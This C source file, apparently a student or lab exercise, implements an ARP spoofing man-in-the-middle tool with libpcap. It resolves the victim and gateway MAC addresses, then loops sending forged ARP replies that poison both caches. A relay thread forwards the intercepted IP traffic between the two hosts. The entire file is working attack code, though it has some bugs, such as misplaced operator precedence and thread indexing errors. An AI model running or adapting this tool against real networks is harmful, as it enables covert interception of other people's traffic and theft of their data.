#include "arp_test.h"
void *arpSpoofing(void *);
void *relay(void *);
int sending = 0;
int main(int argc, char *argv[])
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;
	u_char myMacAddress[6];
	u_char myIpAddress[4];
	u_char targetMacAddress[6];
	u_char gatewayIpAddress[4];
	u_char gatewayMacAddress[6];
	u_char *packet;
	uint32_t ipAddr_tmp;
	uint16_t threadId;
	uint32_t status[10];
	uint32_t status_relay[10];
	uint32_t packet_send;
	uint32_t packet_receive;
	struct arp_packet *ap_receive;
	struct arp_packet ap;
	struct victimInformation victInform[10];
	struct pcap_pkthdr *header;
	
	pthread_t p_thread[10];
	pthread_t p_thread_relay[10];
	if(argc < 4)
	{
		printf("Please input [network interface] [sender ip]+ [target ip]\n");
		exit(-1);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 0, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		exit(-1);
	}
	getMyMacAddress(&myMacAddress); //get My MacAddress
	getIpAddress(&myIpAddress, argv[1]); //get My IPAddress
	

/** Make Thread**/
	for(int j = 0 ; j < argc-3 ; j ++)
	{
		ipAddr_tmp = ntohl(inet_addr(argv[3+2*j])); 
		victInform[j].gatewayIp[0] = (ipAddr_tmp & 0xFF000000) >> 24;
		victInform[j].gatewayIp[1] = (ipAddr_tmp & 0x00FF0000) >> 16;
		victInform[j].gatewayIp[2] = (ipAddr_tmp & 0x0000FF00) >> 8;
		victInform[j].gatewayIp[3] = ipAddr_tmp & 0x000000FF;
			/** (Who has gateway ip?) **/
		for(int i = 0 ; i < 6 ; i ++)
		{
			ap.ether_dhost[i] = 0xFF;
			ap.__ar_tha[i] = 0x00;
		}
		memcpy(ap.ether_shost, myMacAddress, 6);
		ap.ether_type = ntohs(ETHERTYPE_ARP);
		ap.ar_hrd = 0x0100; //Hardware type
		ap.ar_pro = 0x0008; // Protocol type
		ap.ar_hln = 6; // H length
		ap.ar_pln = 4; // P length
		ap.ar_op = 0x0100; //ARPOP_REQUEST
		memcpy(ap.__ar_sha, myMacAddress, 6);
		memcpy(ap.__ar_sip, myIpAddress, 4);
		memcpy(ap.__ar_tip, victInform[j].gatewayIp, 4);
		packet_send = pcap_sendpacket(handle, (u_char *)&ap, 42); //send packet
	/** Get Gateway MacAddress **/
		while(1)
		{
			if(packet_receive = pcap_next_ex(handle, &header, &packet) >= 1) //receive a packet
			{
				ap_receive = (struct arp_packet *)packet;
				if(ntohs(ap_receive->ether_type)!= ETHERTYPE_ARP || ntohs(ap_receive->ar_op) != ARPOP_REPLY || memcmp(ap_receive->__ar_sip, victInform[j].gatewayIp, 4) != 0)
				{ // filter ARP_REPLY packet
					continue;
				}
				//packet += 6;
				//packet += 22; //to get target Mac Address
				memcpy(victInform[j].gatewayMac, ap_receive->__ar_sha, 6);
				printf("Get gateway Mac Address. : %02x %02x %02x %02x %02x %02x \n", ap_receive->__ar_sha[0],  ap_receive->__ar_sha[1],  ap_receive->__ar_sha[2],  ap_receive->__ar_sha[3],  ap_receive->__ar_sha[4],  ap_receive->__ar_sha[5]);
				break;
			}
			else if(packet_receive == -1 || packet_receive == -2)
			{
				printf("Faile to get gateway Mac Address.\n");
				exit(-1);
			}
		}
		victInform[j].handle = handle;
		memcpy(victInform[j].myIp, myIpAddress, 4);
		memcpy(victInform[j].myMac, myMacAddress, 6);
		ipAddr_tmp = ntohl(inet_addr(argv[2*j+2]));
		victInform[j].victimIp[0] = (ipAddr_tmp & 0xFF000000) >> 24;
		victInform[j].victimIp[1] = (ipAddr_tmp & 0x00FF0000) >> 16;
		victInform[j].victimIp[2] = (ipAddr_tmp & 0x0000FF00) >> 8;
		victInform[j].victimIp[3] = ipAddr_tmp & 0x000000FF;
		//victInform[j].gatewayIp[3] = ipAddr_tmp & 0x000000FF;

		/** Stack packet in victInform->ap **/
		strcpy(victInform[j].dev, argv[1]);
		victInform[j].ap.ether_type = ntohs(ETHERTYPE_ARP);
		victInform[j].ap.ar_hrd = 0x0100; //Hardware type
		victInform[j].ap.ar_pro = 0x0008; // Protocol type
		victInform[j].ap.ar_hln = 6; // H length
		victInform[j].ap.ar_pln = 4; // P length
		victInform[j].ap.ar_op = 0x0100; //ARPOP_REQUEST
		for(int i = 0 ; i < 6 ; i ++)
		{
			victInform[j].ap.ether_dhost[i] = 0xFF; 
			victInform[j].ap.ether_shost[i] = myMacAddress[i];
			victInform[j].ap.__ar_sha[i] = myMacAddress[i];
			victInform[j].ap.__ar_tha[i] = 0;
		}
		for(int i = 0 ; i < 4 ; i ++)
		{
			victInform[j].ap.__ar_sip[i] = myIpAddress[i];
			victInform[j].ap.__ar_tip[i] = victInform[j].victimIp[i];
		}
	printf("z");
		threadId = pthread_create(&p_thread[0], NULL, arpSpoofing, (void *)&victInform[j]);
		if(threadId < 0 )
		{
			printf("Failed to create Thread.\n");
		}
		threadId = pthread_create(&p_thread_relay[0], NULL, relay, (void *)&victInform[j]);
		if(threadId < 0 )
		{
			printf("Failed to create Thread.\n");
		}
	printf("z");
		
	}
	for(int j = 0 ; j < argc-3 ; j ++)
	{	
		 pthread_join(p_thread[j], (void **)&status[j]);
		pthread_join(p_thread_relay[j], (void **)&status_relay[j]);
	}
	return 0;
}
void *arpSpoofing(void* p)
{
	pcap_t *handle;
	u_char errbuf[PCAP_ERRBUF_SIZE];
	u_char *packet;
	u_char *packetToVictim;
	u_char *packetToGateway;
	struct pcap_pkthdr *header;
	struct arp_packet *ap_receive;
	struct victimInformation *victInform;
	uint32_t packet_send;
	uint32_t packet_receive;
	uint32_t threadId;
	uint32_t status;	
	pthread_t p_thread;
	victInform = (struct victimInformation* )p;
	packet = (u_char*)&(victInform->ap);
	handle = pcap_open_live(victInform->dev, BUFSIZ, 1, 0, errbuf);
	packet_send = pcap_sendpacket(handle, packet, 42); //send packet
	if(packet_send == -1)
	{
		printf("Failed to send packet.\n");
		exit(-1);
	}
/**** receive target Mac Address ****/
	while(1)
	{
		
		if(packet_receive = pcap_next_ex(handle, &header, &packet) >= 1) //receive a packet
		{
			ap_receive = (struct arp_packet *)packet;
			if(ntohs(ap_receive->ether_type)!= ETHERTYPE_ARP || ntohs(ap_receive->ar_op) != ARPOP_REPLY || memcmp(ap_receive->__ar_sip, victInform->victimIp, 4) != 0) 
			{ // filter ARP_REPLY packet
				continue;
			}
			//packet += 6;
			memcpy(victInform->victimMac, ap_receive->__ar_sha, 6);
			printf("Get target Mac Address.\n");
			break;
		}
		else if(packet_receive == -1 || packet_receive == -2)
		{
			printf("Faile to get target Mac Address.\n");
			exit(-1);
		}
	}

/**** send ARP reply packet ****/
	victInform->ap.ar_op = ntohs(ARPOP_REPLY); //ARPOP_REPLY
	while(1)
	{
		
		for(int i = 0 ; i < 6 ; i ++) //make packet to victim
		{
			victInform->ap.ether_dhost[i] = victInform->victimMac[i];
			victInform->ap.ether_shost[i] = victInform->myMac[i];
			victInform->ap.__ar_tha[i] =  victInform->victimMac[i];
			victInform->ap.__ar_sha[i] = victInform->myMac[i];
		}
		for(int i = 0 ; i < 4 ; i ++)
		{
			victInform->ap.__ar_sip[i] = victInform->gatewayIp[i];
			victInform->ap.__ar_tip[i] = victInform->victimIp[i];
		}
		packetToVictim = (u_char*)&(victInform->ap); 
		packet_send = pcap_sendpacket(handle, packetToVictim, 42); //send packet
		for(int i = 0 ; i < 6 ; i ++) //make packet to gateway
		{
			victInform->ap.ether_dhost[i] = victInform->gatewayMac[i];
			victInform->ap.ether_shost[i] = victInform->myMac[i];
			victInform->ap.__ar_tha[i] =  victInform->gatewayMac[i];
			victInform->ap.__ar_sha[i] = victInform->myMac[i];
		}
		for(int i = 0 ; i < 4 ; i ++)
		{
			victInform->ap.__ar_sip[i] = victInform->victimIp[i];
			victInform->ap.__ar_tip[i] = victInform->gatewayIp[i];
		}
		packetToGateway = (u_char*)&(victInform->ap);
		packet_send = pcap_sendpacket(handle, packetToGateway, 42); //send packet
		if(packet_send == 0)
		{
			printf("ARP Spoofed!\n");
		}
		else if(packet_send != 0)
		{
			printf("Failed to send packet.\n");
			exit(-1);
		}
		sleep(5);
	}	
	pthread_join(p_thread, (void **)&status);
	return 0;
}
//다른 것 sender ip

void *relay(void *p)
{
	pcap_t *handle;
	u_char errbuf[PCAP_ERRBUF_SIZE];
	struct victimInformation *victInform;
	struct arp_packet *ap_receive;
	struct pcap_pkthdr *header;
	uint32_t packet_send;
	uint32_t packet_receive;
	u_char *packet;
	uint32_t packet_length;
	victInform = (struct victimInformation *)p;
	//printf("수신받음\n");
	sleep(1);
	/*victInform->gatewayMac[0] = 0x90;
	victInform->gatewayMac[1] = 0x9f;
	victInform->gatewayMac[2] = 0x33;
	victInform->gatewayMac[3] = 0x9a;
	victInform->gatewayMac[4] = 0x47;
	victInform->gatewayMac[5] = 0x34;*/
	handle = pcap_open_live(victInform->dev, BUFSIZ, 1, 1, errbuf);
	while(1)
	{
		sending = 0;
		if(packet_receive = pcap_next_ex(handle, &header, &packet) == 1) //receive a packet
		{
			ap_receive = (struct arp_packet *)packet;
			if(ntohs(ap_receive->ether_type) == ETHERTYPE_IP)
			{
				printf("packet length : %d : ", ntohs(ap_receive->ar_pro) + 14);
			
				printf("IPTYPE PACKET. :");
				packet_length = ntohs(ap_receive->ar_pro) + 14;
				printf("length : %02x %02x\n", ap_receive->ar_pro & 0xFF00, ap_receive->ar_pro & 0x00FF); 
				printf("\n--------------------\n");
				for(int j = 0 ; j < 30 ; j ++)
				{
					printf("%02x ", packet[j]);
				}
				printf("\n------------------------\n");
			
			}
			else
			{
				continue;
			}
			if(memcmp(ap_receive->ether_shost, victInform->victimMac, 6) == 0) 
			{
				memcpy(ap_receive->ether_shost, victInform->myMac, 6);
				memcpy(ap_receive->ether_dhost , victInform->gatewayMac, 6);
				packet_send = pcap_sendpacket(handle, packet, packet_length); //send packet
				if(packet_send == 0)
				{
					printf("relay victim to gateway\n");
				}
				else
				{
					printf("FAILED to relay victim to gateway\n");
				}
				continue;
			}
			else if(memcmp(ap_receive->ether_shost, victInform->gatewayMac, 6) == 0) //victim to gateway
			{
				memcpy(ap_receive->ether_shost, victInform->myMac,6);
				memcpy(ap_receive->ether_dhost , victInform->victimMac, 6);
				packet_send = pcap_sendpacket(handle, packet, packet_length); //send packet
				if(packet_send == 0)
				{
					printf("relay gateway to victim.\n");
				}
				else
				{
					printf("FAILED to relay gateway to victim\n");
				}
				continue;
			}
			else if(ntohs(ap_receive->ether_type) == 0x0806)
			{
				printf("This is ARP PACKET.\n");
			}
		}
		
	}
}
void getMyMacAddress(u_char *macAddress) //get MacAddress from my sys file
{
	int temp;
	char temp2;
	char asd[20];
	FILE *f = fopen("/sys/class/net/ens33/address", "r"); //read My mac Address
	for(int i = 0 ; i < 6 ; i ++) // 2 ascii to 1 int  ex) "A3" -> 163
	{	
		temp = 0;
		fscanf(f, "%c", &temp2); 
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48) * 16; // convert from ascii to num(0~9), and mul 16
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87) * 16; // convert from ascii to num(10~15), and mul 16
		}
		fscanf(f, "%c", &temp2);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48); //convert from ascii to num (0~9)
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87); //convert from ascii to num (10~15)
		}
		if(i != 5)
		{
			fscanf(f, "%c", &temp2); // Skip ":"
		}
		*(macAddress + i) = temp;
	}
}
void getMacAddress(u_char *packet, u_char *macAddress) //get MacAddress from String
{
	int temp;
	char temp2;
	for(int i = 0 ; i < 6 ; i ++)
	{	
		temp = 0;
		temp2 = *(packet++);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48) * 16; // convert from ascii to num(0~9), and mul 16
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87) * 16; // convert from ascii to num(10~15), and mul 16
		}
		temp2 = *(packet++);
		if(temp2 >= 48 && temp2 <= 57) //if num
		{
			temp += (temp2 - 48); //convert from ascii to num (0~9)
		}
		else if(temp2 >= 97 && temp2 <= 102) //if hex
		{
			temp += (temp2 - 87); //convert from ascii to num (10~15)
		}
		*(macAddress + i) = temp;
	}
}

void getIpAddress(u_char *ipAddress, u_char *interface) //get IpAddress
{
	uint16_t fd;
	struct ifreq ifr;
	uint32_t ipAddr_tmp;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	ipAddr_tmp = ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr); //get Ip Address
	*ipAddress = (ipAddr_tmp & 0xFF000000) >> 24;
	*(ipAddress+1) = (ipAddr_tmp & 0x00FF0000) >> 16;
	*(ipAddress+2) = (ipAddr_tmp & 0x0000FF00) >>8;
	*(ipAddress+3) = ipAddr_tmp & 0x000000FF;
}
